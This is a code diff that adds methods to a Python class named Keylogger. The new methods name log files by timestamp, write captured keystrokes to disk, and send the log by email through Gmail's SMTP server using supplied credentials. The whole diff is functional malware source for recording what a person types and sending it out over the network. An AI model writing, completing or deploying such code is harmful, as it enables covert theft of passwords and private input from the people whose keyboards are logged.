@@ -33,3 +33,21 @@ class Keylogger:
                 name = f"[{name.upper()}"
         self.log += name
         print(self.log)
+
+    def update_filename(self):
+        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
+        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
+        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"
+
+    def report_to_file(self):
+        with open(f"{self.filename}.txt", "w") as f:
+            print(self.log, file=f)
+        print(f"[+] Saved {self.filename}.txt")
+
+    def sendmail(self, email, password, message):
+        # manages a connection to the SMTP server
+        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
+        server.starttls()
+        server.login(email, password)
+        server.sendmail(email, email, message)
+        server.quit()
